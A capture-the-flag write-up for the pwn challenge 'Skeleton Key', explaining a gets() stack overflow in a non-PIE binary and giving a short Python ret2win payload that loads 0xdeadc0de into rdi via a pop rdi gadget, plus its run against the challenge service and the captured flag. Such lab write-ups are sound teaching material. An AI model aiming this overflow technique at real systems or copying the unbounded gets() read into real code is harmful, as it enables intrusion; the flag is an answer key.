# Skeleton Key — Writeup

**Category:** Pwn
**Flag:** `deadface{R355UR3CT_D34D_C0D3}`

## Summary

Sequel to *The Crypt*. The binary greets you with
*"Well, deep in that old crypt, you found your key... but do you know how to
use it?"* — this time the win function takes an argument: `Wretched_Lock(int)`
only unlocks `flag.txt` when `arg == 0xdeadc0de`. The binary ships its own ROP
gadget, so the "skeleton key" is a ret2win-with-argument.

## Analysis

```c
// main (0x401578) — unbounded read into a 64-byte stack buffer
char buf[64];
gets(buf);                       // rbp-0x40 -> 72 bytes to saved RIP

// Wretched_Lock (0x401507) — the dead lock, never called
void Wretched_Lock(int key) {
    if (key == 0xdeadc0de) {                    // the "dead code"
        FILE *f = fopen("flag.txt", "r");
        ...                                      // cats it
    }
}

// gadgets (0x401615) — provided by the author
pop rdi ; ret
pop rsi ; pop rdx ; ret
ret
```

Non-PIE, no canary. Offset to saved RIP is again 64 + 8 = **72**.

## Exploit

Load `0xdeadc0de` into `rdi` with the bundled `pop rdi; ret`, then return into
`Wretched_Lock`:

```python
payload = b"A" * 72
payload += p64(0x401615)      # pop rdi ; ret
payload += p64(0xdeadc0de)    # value -> rdi
payload += p64(0x401507)      # Wretched_Lock(0xdeadc0de)
```

Verified locally, then fired at the service (same host as The Crypt, next
port):

```
$ python3 exploit.py 159.65.228.107 5002
 Well, deep in that old crypt, you found your key...
 ...But do you know how to use it? Let us see:  deadface{R355UR3CT_D34D_C0D3}
```

## Flag

```
deadface{R355UR3CT_D34D_C0D3}
```

Resurrected dead code indeed.
